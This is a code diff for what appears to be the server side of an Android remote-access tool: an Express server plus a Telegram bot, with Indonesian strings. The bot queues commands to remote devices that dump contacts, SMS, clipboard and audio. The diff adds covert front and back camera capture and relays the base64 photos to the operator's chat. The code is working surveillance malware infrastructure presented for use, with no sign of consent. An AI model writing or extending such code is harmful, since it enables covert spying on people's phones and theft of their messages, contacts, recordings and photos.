@@ -90,8 +90,8 @@ let db;
 })();
 
 // --- MIDDLEWARE ---
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json({ limit: '50mb' }));
+app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
 app.use(cookieParser());
 app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, 'templates'));
@@ -206,6 +206,7 @@ Harus diketik dengan format:
             [Markup.button.callback('🔋 Baterai', `runcmd:${devId}:get_battery`), Markup.button.callback('🔦 Torch', `runcmd:${devId}:torch`)],
             [Markup.button.callback('📞 Kontak', `runcmd:${devId}:contacts`), Markup.button.callback('📩 Inbox SMS', `runcmd:${devId}:sms_list`)],
             [Markup.button.callback('🔊 Record Audio', `runcmd:${devId}:record_sound`), Markup.button.callback('📻 Info Volume', `runcmd:${devId}:get_volume`)],
+            [Markup.button.callback('📷 Foto (Belakang)', `runcmd:${devId}:photo back`), Markup.button.callback('🤳 Foto (Depan)', `runcmd:${devId}:photo front`)],
             [Markup.button.callback('🌐 WiFi Scan', `runcmd:${devId}:wifi_scan`), Markup.button.callback('📋 Clipboard', `runcmd:${devId}:clipboard`)],
             [Markup.button.callback('ℹ️ Info Sistem', `runcmd:${devId}:get_device_info`), Markup.button.callback('⚙️ Sensor', `runcmd:${devId}:sensors`)]
         ];
@@ -219,14 +220,18 @@ Harus diketik dengan format:
     // Menangani klik perintah spesifik dari device
     bot.action(/^runcmd:(.+):(.+)$/, async (ctx) => {
         const devId = ctx.match[1];
-        const cmdName = ctx.match[2];
+        const fullCmd = ctx.match[2];
+        const parts = fullCmd.split(' ');
+        const cmdName = parts[0];
+        const cmdText = parts.slice(1).join(' ');
+
         ctx.answerCbQuery(`Menjalankan ${cmdName}...`);
 
         const cmdId = uuidv4().slice(0, 8);
         const chatId = ctx.callbackQuery.message.chat.id.toString();
 
         await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id) VALUES (?, ?, ?, ?, ?, ?)',
-            [cmdId, devId, cmdName, '', 'pending', chatId]);
+            [cmdId, devId, cmdName, cmdText, 'pending', chatId]);
 
         ctx.reply(`⏳ <b>[${cmdName}]</b> masuk ke antrean untuk <code>${devId}</code>...`, { parse_mode: 'HTML' });
     });
@@ -317,6 +322,14 @@ app.post('/response', async (req, res) => {
                         source: audioBuffer,
                         filename: `record_${data.id}.3gp`
                     }, { caption: `✅ <b>Respon Rekaman Suara (${escapeHTML(client_id)})</b>`, parse_mode: 'HTML' });
+                    return res.json({ status: 'received' });
+                }
+
+                if (data.type === 'photo_base64') {
+                    const imageBuffer = Buffer.from(deviceResponse, 'base64');
+                    await bot.telegram.sendPhoto(cmd.chat_id, {
+                        source: imageBuffer
+                    }, { caption: `📸 <b>Respon Jepretan Kamera (${escapeHTML(client_id)})</b>`, parse_mode: 'HTML' });
                     return res.json({ status: 'received' });
                 }
 
